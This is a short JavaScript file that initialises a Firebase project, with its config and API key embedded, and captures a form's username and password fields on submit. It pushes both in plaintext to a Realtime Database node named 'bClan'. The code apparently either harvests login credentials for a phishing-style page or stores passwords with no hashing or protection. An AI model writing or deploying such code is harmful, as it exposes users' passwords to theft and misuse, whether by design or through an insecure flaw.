// Firebase configuration
const firebaseConfig = {
    apiKey: "AIzaSyBZk5ejfFxr06_yNd29imxC1tx_r4xmGM8",
    authDomain: "bclan-8d585.firebaseapp.com",
    databaseURL: "https://bclan-8d585-default-rtdb.firebaseio.com",
    projectId: "bclan-8d585",
    storageBucket: "bclan-8d585.appspot.com",
    messagingSenderId: "700728501283",
    appId: "1:700728501283:web:2760e54f9d4a934b38bd96",
    measurementId: "G-X37XQVGTVR"
};

// Initialize Firebase
firebase.initializeApp(firebaseConfig);

// Reference to the Firebase database
const bClanDB = firebase.database().ref('bClan');

// Event listener for form submission
document.getElementById('bClan').addEventListener("submit", submitForm);

function submitForm(e) {
    e.preventDefault();

    // Get values
    const username = getElementVal('username');
    const password = getElementVal('password');

    // Save messages
    saveMessages(username, password);
}

// Save messages to Firebase
const saveMessages = (username, password) => {
    const newbClan = bClanDB.push();
    newbClan.set({
        username: username,
        password: password
    });
};

// Helper function to get form values
const getElementVal = (id) => {
    return document.getElementById(id).value;
};
